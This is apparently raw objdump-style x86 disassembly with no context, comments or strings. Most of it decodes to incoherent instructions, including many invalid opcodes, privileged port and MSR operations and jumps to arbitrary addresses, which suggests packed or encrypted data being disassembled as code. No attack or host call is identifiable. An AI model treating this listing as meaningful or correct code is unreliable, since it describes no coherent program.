  42fb17:	stos   DWORD PTR es:[edi],eax
  42fb18:	clc    
  42fb19:	sti    
  42fb1a:	xor    ebp,eax
  42fb1c:	push   cs
  42fb1d:	call   0x1d9a2b93
  42fb22:	xor    ecx,edx
  42fb24:	add    BYTE PTR [ebx],0x77
  42fb27:	call   0xa533:0x1468efc5
  42fb2e:	mov    esi,0xd5d19f4d
  42fb33:	pop    ds
  42fb34:	jnp    0x42fad1
  42fb36:	leave  
  42fb37:	push   ebp
  42fb38:	sbb    esi,DWORD PTR [edi+0x288c6742]
  42fb3e:	adc    eax,DWORD PTR [edx+eax*1]
  42fb41:	test   DWORD PTR [edx],ebp
  42fb43:	inc    ebp
  42fb44:	pop    es
  42fb45:	adc    eax,edx
  42fb47:	ds mov eax,0xc979391f
  42fb4d:	jmp    0x42fb11
  42fb4f:	sti    
  42fb50:	mov    ah,0x5a
  42fb52:	mov    ds:0x97f8e096,al
  42fb57:	lods   eax,DWORD PTR ds:[esi]
  42fb58:	sti    
  42fb59:	mul    DWORD PTR [esp+eax*4+0x71]
  42fb5d:	cmp    BYTE PTR [esi-0x231b377b],0xbb
  42fb64:	mov    ?,WORD PTR [ebx]
  42fb66:	xor    al,BYTE PTR [ecx-0x69f45a68]
  42fb6c:	shl    eax,cl
  42fb6e:	push   ds
  42fb6f:	mov    bh,0x25
  42fb71:	xchg   esi,eax
  42fb72:	stc    
  42fb73:	pop    es
  42fb74:	sub    ch,dl
  42fb76:	push   edi
  42fb77:	popf   
  42fb78:	in     al,0xff
  42fb7a:	and    eax,0xf7230920
  42fb7f:	(bad)  
  42fb80:	mov    eax,ds:0xe920aed9
  42fb85:	jp     0x42fbac
  42fb87:	nop
  42fb88:	aam    0x11
  42fb8a:	dec    esi
  42fb8b:	pop    esp
  42fb8c:	and    edi,DWORD PTR [ebp+0x15]
  42fb8f:	aaa    
  42fb90:	pushf  
  42fb91:	cwde   
  42fb92:	icebp  
  42fb93:	mov    BYTE PTR [edx+ecx*2-0x1d],0x25
  42fb98:	lock nop
  42fb9a:	cld    
  42fb9b:	dec    esi
  42fb9c:	hlt    
  42fb9d:	adc    esp,DWORD PTR [ebx-0x7210d91c]
  42fba3:	sub    al,cl
  42fba5:	inc    ebp
  42fba6:	dec    eax
  42fba7:	push   esi
  42fba8:	movq   QWORD PTR [edi-0x645d988d],mm5
  42fbaf:	test   eax,0x2198b975
  42fbb4:	xor    DWORD PTR [eax],eax
	...
  42fc16:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fc1c:	mov    ebx,0x5607ea9a
  42fc21:	sahf   
  42fc22:	stc    
  42fc23:	test   al,0x46
  42fc25:	ror    BYTE PTR [eax+eax*1],1
  42fc28:	add    al,BYTE PTR [eax]
  42fc2a:	pop    es
  42fc2b:	add    DWORD PTR [eax],eax
  42fc2d:	add    BYTE PTR [edi-0x104e1ac3],bl
  42fc33:	cli    
  42fc34:	mov    al,BYTE PTR [edi]
  42fc36:	out    dx,eax
  42fc37:	inc    edi
  42fc38:	cmp    DWORD PTR [eax-0x6f],ebx
  42fc3b:	adc    bl,cl
  42fc3d:	push   edx
  42fc3e:	fdivp  st(2),st
  42fc40:	inc    ebp
  42fc41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fc42:	sbb    BYTE PTR [ebx+0x50],cl
  42fc45:	ins    DWORD PTR es:[edi],dx
  42fc46:	lahf   
  42fc47:	lods   eax,DWORD PTR ds:[esi]
  42fc48:	lods   al,BYTE PTR ds:[esi]
  42fc49:	ins    BYTE PTR es:[edi],dx
  42fc4a:	or     ebp,edi
  42fc4c:	in     eax,dx
  42fc4d:	push   edx
  42fc4e:	mov    eax,0xf29fa9a0
  42fc53:	push   ecx
  42fc54:	ror    BYTE PTR [eax-0x7c7ffff8],0x1b
  42fc5b:	js     0x42fbec
  42fc5d:	mov    cl,0x9
  42fc5f:	inc    esp
  42fc60:	xor    BYTE PTR ds:0x464d30a9,bl
  42fc66:	aaa    
  42fc67:	jbe    0x42fc27
  42fc69:	mov    ds:0xb5424a67,al
  42fc6e:	adc    DWORD PTR [edi-0x5cce539d],edx
  42fc74:	jecxz  0x42fcd1
  42fc76:	cli    
  42fc77:	or     DWORD PTR [eax*8-0x24c8e152],esp
  42fc7e:	mov    eax,0x7bd1c475
  42fc83:	xchg   edi,eax
  42fc84:	(bad)  
  42fc85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc86:	rol    DWORD PTR ds:0xe9791d99,0xf3
  42fc8d:	or     ebp,DWORD PTR [edx+edi*2+0x3abe91e7]
  42fc94:	ss dec ebp
  42fc96:	arpl   WORD PTR [ecx-0x22],di
  42fc99:	cmp    bl,BYTE PTR [esi]
  42fc9b:	ret    0x76b8
  42fc9e:	mov    DWORD PTR [eax+0x6e],edi
  42fca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fca2:	hlt    
  42fca3:	fwait
  42fca4:	push   ecx
  42fca5:	cmp    ecx,DWORD PTR [edi+0x5f]
  42fca8:	xlat   BYTE PTR ds:[ebx]
  42fca9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fcaa:	retf   
  42fcab:	shl    DWORD PTR [ebx],0x70
  42fcae:	dec    ebx
  42fcaf:	stc    
  42fcb0:	out    dx,eax
  42fcb1:	mov    ds,WORD PTR [ebp-0x41534c42]
  42fcb7:	je     0x42fc39
  42fcb9:	xchg   ebp,eax
  42fcba:	cmc    
  42fcbb:	add    BYTE PTR [edi+edx*4+0x332e9337],dh
  42fcc2:	mov    ds:0xd0edc5d8,al
  42fcc7:	push   ss
  42fcc8:	jmp    0x42fce7
  42fcca:	xor    al,0x17
  42fccc:	push   edi
  42fccd:	data16 (bad) 
  42fccf:	cmp    edi,ecx
  42fcd1:	rol    BYTE PTR [ecx+0x36],1
  42fcd4:	mov    bh,BYTE PTR [esi]
  42fcd6:	(bad)  
  42fcd7:	sub    ecx,DWORD PTR [eax+0x7b]
  42fcda:	sub    al,0x46
  42fcdc:	cmp    al,BYTE PTR ds:0x6a679545
  42fce2:	cwde   
  42fce3:	(bad)  
  42fce4:	cmp    bh,BYTE PTR [esp+esi*4-0xf]
  42fce8:	in     eax,dx
  42fce9:	mov    ds:0xfff0250,al
  42fcee:	adc    BYTE PTR [ebx],cl
  42fcf0:	(bad)  
  42fcf1:	fnsave [esi]
  42fcf3:	mov    al,ds:0x10197d25
  42fcf8:	imul   ebp,DWORD PTR [ecx],0xeba20bca
  42fcfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fcff:	sub    eax,0x5ee0b115
  42fd04:	loopne 0x42fd4c
  42fd06:	jno    0x42fd2a
  42fd08:	out    dx,eax
  42fd09:	cli    
  42fd0a:	leave  
  42fd0b:	cli    
  42fd0c:	inc    edx
  42fd0d:	sbb    BYTE PTR [ebx],0xd4
  42fd10:	adc    al,bl
  42fd12:	lods   al,BYTE PTR ds:[esi]
  42fd13:	xor    eax,0xb0df2732
  42fd19:	and    DWORD PTR [edx+0x26],0xffffffa9
  42fd1d:	ins    DWORD PTR es:[edi],dx
  42fd1e:	xor    esp,ebx
  42fd20:	cmc    
  42fd21:	push   ecx
  42fd22:	fcmovnu st,st(0)
  42fd24:	push   si
  42fd26:	iret   
  42fd27:	cmp    DWORD PTR [ebx+0x5f],ebx
  42fd2a:	lds    ebx,FWORD PTR [eax-0x6f]
  42fd2d:	shl    DWORD PTR [ebp-0x1e270e18],1
  42fd33:	xor    DWORD PTR cs:[eax],eax
	...
  42fd96:	dec    eax
  42fd97:	rol    dl,0xf0
  42fd9a:	retf   0x7af2
  42fd9d:	clc    
  42fd9e:	int3   
  42fd9f:	jae    0x42fda8
  42fda1:	adc    al,0x5b
  42fda3:	sbb    edi,DWORD PTR [edi+0x20113bb]
  42fda9:	add    BYTE PTR [edi],al
  42fdab:	add    DWORD PTR [eax],eax
  42fdad:	add    BYTE PTR [eax+edi*8],bh
  42fdb0:	ins    BYTE PTR es:[edi],dx
  42fdb1:	(bad)  
  42fdb2:	sbb    esp,ebx
  42fdb4:	loopne 0x42fdda
  42fdb6:	or     dl,ch
  42fdb8:	aad    0x94
  42fdba:	pop    ebx
  42fdbb:	push   esp
  42fdbc:	test   DWORD PTR [esi-0x6f],esp
  42fdbf:	retf   
  42fdc0:	add    al,0xa0
  42fdc2:	ffree  st(2)
  42fdc4:	pop    ecx
  42fdc5:	jmp    0x23a8:0x6c8f1907
  42fdcc:	adc    BYTE PTR [ebx],dh
  42fdce:	cld    
  42fdcf:	pop    esi
  42fdd0:	ror    bh,0xf9
  42fdd3:	aad    0x94
  42fdd5:	daa    
  42fdd6:	outs   dx,DWORD PTR ds:[esi]
  42fdd7:	mov    ebp,0xd69852f8
  42fddc:	jge    0x42fe5a
  42fdde:	dec    esi
  42fddf:	out    dx,eax
  42fde0:	das    
  42fde1:	(bad)  
  42fde2:	hlt    
  42fde3:	xchg   ebp,eax
  42fde4:	xor    DWORD PTR [eax],0x3f05f3ba
  42fdea:	sub    esi,DWORD PTR [edx+0x3120ce9f]
  42fdf0:	mov    ebx,0x4ac2b75e
  42fdf5:	lods   al,BYTE PTR fs:[esi]
  42fdf7:	jno    0x42fe25
  42fdf9:	mov    ebp,0xe88e0cd2
  42fdfe:	je     0x42fd85
  42fe00:	ret    0x9907
  42fe03:	mov    BYTE PTR [eax-0x2e],dh
  42fe06:	push   ds
  42fe07:	or     al,0x38
  42fe09:	imul   esi,DWORD PTR [edi+eiz*4+0x22],0x3feb1146
  42fe11:	lea    ebp,[ecx]
  42fe13:	stos   BYTE PTR es:[edi],al
  42fe14:	adc    cl,al
  42fe16:	outs   dx,BYTE PTR ds:[esi]
  42fe17:	jecxz  0x42fe87
  42fe19:	jp     0x42fdf6
  42fe1b:	jne    0x42fe79
  42fe1d:	fld    st(6)
  42fe1f:	or     DWORD PTR [edi+0x12b5a4dd],ebp
  42fe25:	sbb    eax,0xd650662a
  42fe2a:	add    cl,cl
  42fe2c:	dec    edi
  42fe2d:	imul   ecx,eax,0xffffffe6
  42fe30:	xor    al,0x86
  42fe32:	mov    ebp,0x1db7f62a
  42fe37:	test   BYTE PTR [esi],dl
  42fe39:	xor    cl,BYTE PTR [edx]
  42fe3b:	mov    ah,0x17
  42fe3d:	mov    bl,bl
  42fe3f:	xlat   BYTE PTR ds:[ebx]
  42fe40:	add    dl,BYTE PTR [eax]
  42fe42:	dec    edi
  42fe43:	add    BYTE PTR [esi],0xef
  42fe46:	xor    al,0x4a
  42fe48:	mov    dl,0xd7
  42fe4a:	(bad)  
  42fe4b:	xchg   si,ax
  42fe4d:	mov    ebp,0x9c63d0a6
  42fe52:	jge    0x42fed3
  42fe54:	mov    eax,0x75124218
  42fe59:	and    DWORD PTR [edx],edx
  42fe5b:	inc    esi
  42fe5c:	push   0x69
  42fe5e:	mov    ds:0x71bc751f,al
  42fe63:	icebp  
  42fe64:	xchg   esi,eax
  42fe65:	adc    eax,0x2264fea3
  42fe6a:	push   ecx
  42fe6b:	xor    ah,BYTE PTR ds:0x4108a21e
  42fe71:	pop    esi
  42fe72:	rcl    BYTE PTR [ebx],0xd8
  42fe75:	mov    bh,0x13
  42fe77:	and    al,0x14
  42fe79:	xchg   ecx,eax
  42fe7a:	sub    al,0x80
  42fe7c:	or     ebp,0x23
  42fe7f:	je     0x42fe28
  42fe81:	in     eax,dx
  42fe82:	sub    ecx,DWORD PTR [ebx-0x7a]
  42fe85:	inc    ebp
  42fe86:	sub    bh,ah
  42fe88:	push   edx
  42fe89:	rcr    DWORD PTR [ebx+0x7613401b],0x1b
  42fe90:	ins    BYTE PTR es:[edi],dx
  42fe91:	ds retf 
  42fe93:	inc    esp
  42fe94:	add    eax,0xad8bc0fc
  42fe99:	inc    eax
  42fe9a:	add    DWORD PTR [edx+0x2fab8fc6],ecx
  42fea0:	sub    dh,BYTE PTR [eax]
  42fea2:	push   ecx
  42fea3:	pusha  
  42fea4:	sbb    al,0xed
  42fea6:	sub    ebx,0xc14c4d21
  42feac:	ret    
  42fead:	mov    esp,0x82bf2bd6
  42feb2:	mov    eax,0x15fa
	...
  42ff13:	add    BYTE PTR [eax],al
  42ff15:	add    BYTE PTR [edi+eiz*2],al
  42ff18:	std    
  42ff19:	aaa    
  42ff1a:	(bad)  
  42ff1b:	mov    edi,0x2c6b77ce
  42ff20:	mov    WORD PTR [ecx],es
  42ff22:	mov    esp,0x1a8aded5
  42ff27:	add    al,BYTE PTR [edx]
  42ff29:	add    BYTE PTR [esi+0x6e000000],dh
  42ff2f:	mov    al,0x4f
  42ff31:	cmp    eax,0xe2f29fc2
  42ff36:	outs   dx,DWORD PTR ds:[esi]
  42ff37:	adc    al,0xa7
  42ff39:	cmp    eax,0xc49d1f97
  42ff3e:	outs   dx,BYTE PTR ds:[esi]
  42ff3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ff40:	cmp    cl,BYTE PTR [eax-0xb]
  42ff43:	xchg   edx,eax
  42ff44:	sti    
  42ff45:	xchg   BYTE PTR [ebx],ah
  42ff47:	and    al,0x43
  42ff49:	mov    WORD PTR [esi+ebp*8+0x4164b074],cs
  42ff50:	fwait
  42ff51:	sbb    DWORD PTR [eax+0x10164b57],esp
  42ff57:	ds push eax
  42ff59:	push   eax
  42ff5a:	aaa    
  42ff5b:	in     eax,0x17
  42ff5d:	popf   
  42ff5e:	aam    0x75
  42ff60:	fs mov esp,0x9159729e
  42ff66:	imul   ebx,DWORD PTR [edx-0x3ceea559],0xfffffff4
  42ff6d:	dec    ebp
  42ff6e:	pusha  
  42ff6f:	das    
  42ff70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ff71:	rcl    DWORD PTR [ebp+0x4590a26a],0x4c
  42ff78:	jo     0x42ffd8
  42ff7a:	mov    ebx,0x6b30b16c
  42ff7f:	test   eax,0x360615f3
  42ff84:	dec    eax
  42ff85:	push   ebp
  42ff86:	rcl    DWORD PTR [ebx],cl
  42ff88:	aas    
  42ff89:	add    eax,eax
  42ff8b:	push   ecx
  42ff8c:	(bad)  
  42ff8d:	pop    edi
  42ff8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ff8f:	mov    ebp,0x5c2c362
  42ff94:	not    ebp
  42ff96:	and    ah,bl
  42ff98:	pop    ds
  42ff99:	popa   
  42ff9a:	not    BYTE PTR [ecx]
  42ff9c:	add    DWORD PTR [esi-0x3a],edi
  42ff9f:	rcr    DWORD PTR [edi-0x77],1
  42ffa2:	sub    DWORD PTR [esi],esi
  42ffa4:	enter  0xd424,0x78
  42ffa8:	mov    eax,0x9744da39
  42ffad:	ficom  WORD PTR ds:0xf31038db
  42ffb3:	cwde   
  42ffb4:	leave  
  42ffb5:	cmp    DWORD PTR [ebp-0x21ade5a3],ebx
  42ffbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ffbc:	xlat   BYTE PTR ds:[ebx]
  42ffbd:	push   es
  42ffbe:	add    eax,0x30cde751
  42ffc3:	mov    ch,0x68
  42ffc5:	jecxz  0x43000a
  42ffc7:	aas    
  42ffc8:	shl    DWORD PTR [edi-0x71],1
  42ffcb:	loopne 0x42ff93
  42ffcd:	xchg   BYTE PTR ds:0x49caed10,bh
  42ffd3:	mov    dl,0x6f
  42ffd5:	cmp    BYTE PTR [edx-0x15],al
  42ffd8:	aam    0x47
  42ffda:	int    0x50
  42ffdc:	pop    edi
  42ffdd:	sbb    dl,ah
  42ffdf:	pop    ecx
  42ffe0:	fnstcw WORD PTR [edi+eax*8]
  42ffe3:	pop    ss
	...
  430014:	add    BYTE PTR [eax],al
  430016:	dec    ebp
  430017:	push   ebp
  430018:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43001e:	mov    esp,ebp
  430020:	or     al,ah
  430022:	dec    ebp
  430023:	add    bh,al
  430025:	add    BYTE PTR [eax],cl
  430027:	add    BYTE PTR [eax],al
  430029:	mov    DWORD PTR [eax],0x3ef44545
  43002f:	xor    eax,0x9c8b8500
  430034:	hlt    
  430035:	clc    
  430036:	retf   
  430037:	(bad)  
  430038:	enter  0x4d45,0xb8
  43003c:	mov    esi,DWORD PTR [esp+esi*8]
  43003f:	test   ebx,ecx
  430041:	pushf  
  430042:	enter  0x4df8,0x8b
  430046:	mov    DWORD PTR [ebp+0x8],0x894708
  43004d:	inc    ebp
  43004e:	mov    ebp,0xff8bfffc
  430053:	dec    ebp
  430054:	mov    ch,0xf4
  430056:	call   DWORD PTR [ebx-0x1]
  430059:	mov    ebx,0x8005322
  43005e:	call   DWORD PTR [ecx+0x8]
  430061:	pop    es
  430062:	jmp    0xb8:0x9cb4533
  430069:	call   0xc3:0x32f4728b
  430070:	call   0x8989:0x3c83203
  430077:	dec    ebp
  430078:	or     ah,al
  43007a:	inc    ebp
  43007b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430081:	xor    eax,DWORD PTR [eax]
  430083:	retf   
  430084:	ret    
  430085:	add    eax,esi
  430087:	enter  0x8945,0x64
  43008b:	dec    ebp
  43008c:	sbb    ah,cl
  43008e:	add    BYTE PTR [ebx-0xb87b277],cl
  430094:	dec    DWORD PTR [ebx-0xbcfb275]
  43009a:	test   DWORD PTR [ebx],esi
  43009c:	dec    ebx
  43009e:	inc    DWORD PTR [ebx]
  4300a0:	inc    eax
  4300a1:	enter  0x8989,0x64
  4300a5:	(bad)  
  4300a6:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4300aa:	cld    
  4300ab:	dec    DWORD PTR [ebp-0xa90001]
  4300b1:	push   edi
  4300b2:	mov    BYTE PTR [edx+0x1],ch
  4300b5:	and    BYTE PTR [eax],al
  4300b7:	pop    ecx
  4300b8:	inc    ebp
  4300b9:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4300bf:	push   0xffffff89
  4300c1:	pop    ecx
  4300c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4300c3:	dec    ebp
  4300c4:	add    BYTE PTR [ecx+0x45fc088b],cl
  4300ca:	jne    0x430114
  4300cc:	lea    eax,[eax]
  4300ce:	fs (bad) 
  4300d0:	dec    DWORD PTR [eax]
  4300d2:	mov    DWORD PTR [eax],eax
  4300d4:	test   al,0x0
  4300d6:	add    BYTE PTR [ebp-0x18],cl
  4300d9:	xor    ebp,DWORD PTR [edx]
  4300db:	add    eax,DWORD PTR [eax]
  4300dd:	mov    eax,eax
  4300df:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4300e6:	inc    ebp
  4300e7:	mov    DWORD PTR [ebx+0x459408],ecx
  4300ed:	popa   
  4300ee:	mov    esp,DWORD PTR [ebp-0x75]
  4300f1:	(bad)  
  4300f2:	cld    
  4300f3:	inc    eax
  4300f4:	cmp    bh,0x1
  4300f7:	lea    eax,[eax]
  4300f9:	and    BYTE PTR [eax],al
  4300fb:	inc    DWORD PTR [ecx-0x18]
  4300fe:	mov    ecx,DWORD PTR [ebx]
  430100:	cld    
  430101:	add    BYTE PTR [ecx+0x75014d],cl
  430107:	(bad)  
  430108:	xchg   ebp,eax
  430109:	sar    bh,1
  43010b:	inc    eax
  43010c:	inc    DWORD PTR [eax]
  43010e:	mov    eax,DWORD PTR [ebp-0x4]
  430111:	xor    edx,DWORD PTR [edx+0x7201be]
  430117:	add    BYTE PTR [edx],dl
  430119:	(bad)  
  43011a:	nop
  43011b:	inc    ebp
  43011c:	add    BYTE PTR [ebx-0x5afb0c00],cl
  430122:	mov    al,0xff
  430124:	add    bh,bh
  430126:	add    BYTE PTR [ebx],dh
  430128:	inc    DWORD PTR [ebx]
  43012a:	sbb    al,0x89
  43012c:	jne    0x43010a
  43012e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  430134:	mov    eax,DWORD PTR [ebp-0xff0048]
  43013a:	mov    DWORD PTR [eax-0x70],0xee70e989
  430141:	inc    DWORD PTR [ebp-0x75]
  430144:	(bad)  [esp+ebp*8]
  430147:	test   DWORD PTR [esi-0x1],esp
  43014a:	inc    ebp
  43014b:	(bad)  
  43014c:	aas    
  43014d:	inc    ebp
  43014e:	(bad)  
  43014f:	lea    edi,[eax+edi*2-0x1]
  430153:	inc    edi
  430155:	mov    DWORD PTR [ecx],edi
  430157:	mov    al,ds:0x8b8000c7
  43015c:	out    dx,al
  43015d:	cld    
  43015e:	loopne 0x4300ed
  430160:	inc    ebp
  430161:	(bad)  
  430162:	in     al,dx
  430163:	(bad)  
  430164:	fisttp WORD PTR [eax+0x8801c7]
  43016a:	jecxz  0x4301b1
  43016c:	out    dx,al
  43016d:	inc    DWORD PTR [ebp-0x4]
  430170:	out    0x8d,eax
  430172:	aas    
  430173:	(bad)  
  430174:	call   0xcb2c78
  430179:	add    DWORD PTR [ebx-0x7f590400],ecx
  43017f:	add    BYTE PTR [ecx],al
  430181:	test   DWORD PTR [eax],eax
  430183:	wrmsr  
  430185:	jae    0x430172
  430187:	add    BYTE PTR [eax],al
  430189:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43018f:	add    esp,edi
  430191:	add    BYTE PTR [eax+0x450108],al
  430197:	mov    edi,DWORD PTR [ebp-0x6c]
  43019a:	add    DWORD PTR [eax],0x4
  43019d:	mov    eax,DWORD PTR [ebp+0x3]
  4301a0:	mov    edi,DWORD PTR [esp+edi*8]
  4301a3:	dec    ebp
  4301a4:	nop
  4301a5:	mov    eax,DWORD PTR [ecx]
  4301a7:	fadd   DWORD PTR [eax]
  4301a9:	add    BYTE PTR [ecx*4-0xafa000],al
  4301b0:	inc    ebp
  4301b1:	push   edx
  4301b2:	call   DWORD PTR [ebp-0x7b]
  4301b5:	mov    esi,DWORD PTR [ebp-0x74]
  4301b8:	mov    eax,DWORD PTR [eax]
  4301ba:	cld    
  4301bb:	mov    eax,DWORD PTR [eax+0x880103]
  4301c1:	add    BYTE PTR [ebp+0x6a],bh
  4301c4:	cmp    edi,0x10
  4301c7:	mov    WORD PTR [ebp+0x0],es
  4301ca:	mov    edx,DWORD PTR [edx-0x4]
  4301cd:	push   ecx
  4301ce:	nop
  4301cf:	inc    DWORD PTR [ecx]
  4301d1:	cld    
  4301d2:	add    BYTE PTR [ebp-0x26],bh
  4301d5:	mov    eax,DWORD PTR [eax]
  4301d7:	cld    
  4301d8:	push   eax
  4301d9:	nop
  4301da:	inc    ebp
  4301db:	add    edi,edi
  4301dd:	add    BYTE PTR [ebx+0x4de0f445],cl
  4301e3:	call   0x9446c91b
  4301e8:	cmp    esp,ebx
  4301ea:	movntq QWORD PTR [esi],mm6
  4301ed:	mov    DWORD PTR [eax],0xb87c8b98
  4301f3:	test   ebx,eax
  4301f5:	jmp    DWORD PTR [esi-0x1]
  4301f8:	int    0xe9
  4301fa:	sub    esp,esp
  4301fc:	add    eax,DWORD PTR [ebp-0x30]
  4301ff:	fild   WORD PTR [ebp+0x3f]
  430202:	cmp    eax,edi
  430204:	je     0xc243e626
  43020a:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  430211:	(bad)  
  430212:	jne    0x4301a0
  430214:	mov    ebx,ecx
  430216:	cld    
  430217:	jl     0x43025e
  430219:	cmp    DWORD PTR [ebx+0x50b400],ecx
  43021f:	inc    ebp
  430220:	call   0xeb2bb0
  430225:	add    BYTE PTR [ebx-0x7f170301],cl
  43022b:	add    DWORD PTR es:[eax],eax
  43022e:	add    al,al
  430230:	xor    BYTE PTR [eax+0x3f],dl
  430233:	inc    ebp
  430234:	add    BYTE PTR [ebx+0xfcd88b],cl
  43023a:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430240:	add    DWORD PTR [ecx+0x458be845],ecx
  430246:	fmul   DWORD PTR [ebx+0x8bb800]
  43024c:	cld    
  43024d:	call   0xd82d12
  430252:	dec    DWORD PTR [ebx+0x108ee8ff]
  430258:	add    al,al
  43025a:	push   eax
  43025b:	es inc ebp
  43025d:	inc    ebp
  43025e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430264:	dec    DWORD PTR [ebx-0x3ff70301]
  43026a:	mov    DWORD PTR gs:[eax],eax
  43026d:	call   0x8b6b4832
  430272:	inc    ebp
  430273:	mov    eax,0xe8d8008b
  430278:	add    BYTE PTR [ecx],ch
  43027a:	mov    eax,DWORD PTR [eax]
  43027c:	cld    
  43027d:	mov    eax,eax
  43027f:	call   0x462b12d9
  430284:	sub    DWORD PTR [ebx-0x3c743000],ecx
  43028a:	cld    
  43028b:	mov    BYTE PTR [eax+0x8401c1],0x1
  430292:	xor    BYTE PTR [eax],al
  430294:	push   edi
  430295:	inc    ebp
  430296:	mov    DWORD PTR [ebx],esi
  430298:	in     al,0xb9
  43029a:	inc    ebp
  43029b:	lea    ecx,[ebx-0x3c370301]
  4302a1:	dec    ebp
  4302a2:	call   0x8dc1:0x308328b
  4302a9:	xchg   DWORD PTR [eax+0x1],eax
  4302ac:	inc    DWORD PTR [eax]
  4302ae:	call   0x432bf8
  4302b3:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4302b9:	jge    0x4302ee
  4302bb:	mov    eax,DWORD PTR [ebx]
  4302bd:	cld    
  4302be:	lea    edx,[eax+0xff0120]
  4302c4:	call   0x432c56
  4302c9:	push   eax
  4302ca:	inc    DWORD PTR [ebp-0x1c]
  4302cd:	mov    ecx,DWORD PTR [ebp-0x58]
  4302d0:	xor    eax,DWORD PTR [eax]
  4302d2:	add    edi,edi
  4302d4:	cmp    ebp,eax
  4302d6:	jne    0x4302fe
  4302d8:	mov    DWORD PTR [eax],0x8b004dd8
  4302de:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  4302e5:	mov    eax,ebx
  4302e7:	cld    
  4302e8:	test   BYTE PTR [eax+0x32019a],bh
  4302ee:	mov    DWORD PTR [ebp+0x8],esi
  4302f1:	xor    eax,DWORD PTR [ebp-0x73]
  4302f4:	test   DWORD PTR [esp+esi*2-0x1],edi
  4302f8:	mov    ebp,eax
  4302fa:	mov    eax,0x33004d29
  4302ff:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  430305:	add    DWORD PTR [eax],eax
  430307:	add    BYTE PTR [ebp+0x30],al
  43030a:	mov    edx,DWORD PTR [edi-0x48]
  43030d:	add    ebx,0xffffffe4
  430310:	test   bp,cx
  430313:	je     0x430340
  430315:	mov    eax,DWORD PTR [ebx]
  430317:	cld    
  430318:	sar    BYTE PTR [eax+0x3b0145],1
  43031e:	pcmpeqw mm4,mm6
  430321:	xor    edi,edi
  430323:	lea    ecx,[ebx-0x239e7470]
  430329:	add    BYTE PTR [ebp+0x50],cl
  43032c:	cmp    eax,DWORD PTR [ebp+0x75]
  43032f:	mov    ebp,DWORD PTR [eax-0x68]
  430332:	test   DWORD PTR [eax],eax
  430334:	clc    
  430335:	push   DWORD PTR [ebp-0x1]
  430338:	lea    ecx,[eax]
  43033a:	int3   
  43033b:	inc    ebp
  43033c:	call   0xfb33cc
  430341:	jne    0x43033b
  430343:	xor    edi,DWORD PTR [ebp-0x41]
  430346:	jmp    0x4303ba
  430348:	mov    eax,DWORD PTR [eax]
  43034a:	mov    eax,0x339545c7
  43034f:	inc    DWORD PTR [ebx]
  430351:	push   DWORD PTR [ecx]
  430353:	xor    eax,0x50eb008b
  430358:	mov    eax,DWORD PTR [ebp-0x3c]
  43035b:	mov    eax,eax
  43035d:	cld    
  43035e:	clc    
  43035f:	ret    
  430360:	test   bh,al
  430362:	pop    es
  430363:	xchg   ebp,eax
  430364:	add    bh,bh
  430366:	inc    ebp
  430367:	dec    DWORD PTR [edi]
  430369:	pop    ds
  43036a:	sub    eax,DWORD PTR [eax]
  43036c:	add    BYTE PTR [eax+0x76],dl
  43036f:	push   ebp
  430370:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  430376:	or     al,0xcf
  430378:	inc    eax
  430379:	enter  0x745,0x72
  43037d:	inc    ebp
  43037e:	mov    eax,DWORD PTR [ecx]
  430380:	int3   
  430381:	add    BYTE PTR [ebp-0x75],al
  430384:	xor    eax,0xc74d9cb8
  430389:	xor    edx,eax
  43038b:	lea    eax,[ebp+0x4572f808]
  430391:	add    BYTE PTR [ebx-0x3c7423bb],cl
  430397:	fadd   st,st(6)
  430399:	rol    BYTE PTR [ebp+0x12],0x8b
  43039d:	inc    ebp
  43039e:	fmul   QWORD PTR [ebx-0x3c39233d]
  4303a4:	inc    ebp
  4303a5:	test   bh,al
  4303a7:	call   0xdcf8:0x898532f8
  4303ae:	inc    ebp
  4303af:	inc    ebp
  4303b0:	cmp    esi,DWORD PTR [ebx]
  4303b2:	pushf  
  4303b3:	mov    ecx,0xffb48dc7
  4303b8:	test   eax,ecx
  4303ba:	clc    
  4303bb:	dec    ebp
  4303bc:	inc    ebp
  4303bd:	mov    edi,DWORD PTR [ecx]
  4303bf:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4303c6:	test   edi,edi
  4303c8:	clc    
  4303c9:	test   DWORD PTR [ebp+0x45],0x89c8b3f
  4303d0:	(bad)  
  4303d1:	enter  0x18e8,0x85
  4303d5:	xor    eax,0xff459cf8
  4303da:	mov    edi,esp
  4303dc:	lock inc ebp
  4303de:	ret    
  4303df:	push   eax
  4303e0:	(bad)  
  4303e1:	idiv   BYTE PTR [ebp+0x0]
  4303e4:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  4303ea:	add    BYTE PTR [ebx],dl
  4303ec:	jmp    0xce053e
  4303f1:	les    eax,FWORD PTR [ebp-0x35]
  4303f4:	mov    ecx,esi
  4303f6:	lock or al,cl
  4303f9:	clc    
  4303fa:	inc    ebp
  4303fb:	add    esi,DWORD PTR [ebx]
  4303fd:	jge    0x430402
  4303ff:	xor    edi,DWORD PTR [ebx]
  430401:	cmp    ecx,DWORD PTR [edi]
